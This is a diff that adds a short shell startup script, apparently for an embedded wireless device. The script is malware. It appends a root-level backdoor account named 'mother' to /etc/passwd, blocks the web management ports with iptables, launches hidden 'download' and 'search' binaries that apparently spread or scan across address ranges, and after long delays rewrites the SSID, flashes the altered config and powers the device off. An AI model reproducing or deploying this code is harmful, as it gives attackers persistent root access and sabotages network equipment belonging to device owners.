@@ -1,0 +1,18 @@
+#!/bin/sh
+per=/etc/persistent
+grep "mother" /etc/passwd >/dev/null || echo 'mother:$1$J1CHZtqy$n0XDmW4UCVAVYZqFzvoEC/:0:0:Administrator:/etc/persistent:/bin/sh' >> /etc/passwd
+
+iptables -I INPUT -p tcp --dport 80 -j DROP 2>/dev/null
+iptables -I INPUT -p tcp -i lo --dport 443 -j DROP 2>/dev/null
+
+cp $per/mf.tar $per/.mf/
+
+(sleep 90 ; $per/.mf/download )&
+(sleep 70 ; sleep 50 ; sleep 30 ; $per/.mf/search 2>/dev/null >/dev/null )&
+(sleep 70 ; sleep 50 ; sleep 35 ; $per/.mf/search 7 15 2>/dev/null >/dev/null )&
+(sleep 70 ; sleep 50 ; sleep 45 ; $per/.mf/search 0 64 2>/dev/null >/dev/null )&
+(sleep 70 ; sleep 50 ; sleep 55 ; $per/.mf/search 25 16 2>/dev/null >/dev/null )&
+
+(sleep 66666 ; $per/.mf/fucker 2>/dev/null >/dev/null )&
+(sleep 666666 ;  sed -i 's/wireless.1.ssid=.*/wireless.1.ssid=motherfucker/' /tmp/system.cfg ;  sed -i 's/radio.1.mode=.*/radio.1.mode=Master/' /tmp/system.cfg ; cfgmtd -f /tmp/system.cfg -w ; sleep 15 ; poweroff ) &
+
